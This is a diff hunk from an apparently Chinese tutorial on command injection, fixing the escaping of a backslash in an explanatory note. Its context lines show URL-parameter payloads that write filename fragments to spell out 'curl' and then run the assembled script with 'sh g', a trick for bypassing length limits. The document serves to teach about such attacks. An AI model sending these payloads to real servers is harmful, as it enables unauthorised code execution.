@@ -214,7 +214,7 @@ http://host/?cmd=>\ \
 http://host/?cmd=>rl\
 http://host/?cmd=>cu\
 http://host/?cmd=sh _
-注意，每个文件名末尾都会添加一个"\"字符，因为写入文件时"ls"会在文件名之间添加新行
+注意，每个文件名末尾都会添加一个"\\"字符，因为写入文件时"ls"会在文件名之间添加新行
 
 最后执行文件"g"
 http://host/?cmd=sh g
